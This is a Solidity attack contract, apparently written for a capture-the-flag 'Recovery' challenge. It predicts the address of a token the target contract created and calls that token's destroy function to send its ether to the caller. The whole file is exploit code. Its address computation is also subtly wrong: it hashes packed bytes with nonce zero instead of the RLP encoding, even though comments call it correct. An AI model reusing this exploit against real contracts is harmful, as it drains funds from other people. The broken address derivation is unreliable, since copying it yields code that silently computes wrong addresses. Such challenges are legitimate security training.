pragma solidity ^0.8.0;

interface Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) external;
}

interface SimpleToken {
    function destroy(address payable _to) external;
}

contract FinalCorrectAttacker {
    address immutable recoveryInstance;

    constructor(address _recovery) {
        recoveryInstance = _recovery;
    }

    function computeTokenAddress() internal pure returns (address) {
        address sender = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
        bytes8 nonceBytes = bytes8(uint64(0));
        bytes32 contractHash = keccak256(abi.encodePacked(bytes20(sender), nonceBytes));
        return address(uint160(bytes20(contractHash)));
    }

    function attack() external payable {
        Recovery recovery = Recovery(recoveryInstance);
        // Step 1: Create token via Recovery
        recovery.generateToken("Test", 100000000000000);

        // Step 2: Calculate correct address (nonce=0)
        address tokenAddress = computeTokenAddress();

        // Step 3: Send ETH to trigger receive()
        (bool success,) = payable(tokenAddress).call{value: 1 ether}(
            bytes("")
        );
        require(success, "ETH transfer failed");

        // Step 4: Destroy the token
        SimpleToken(tokenAddress).destroy(payable(msg.sender));
    }
}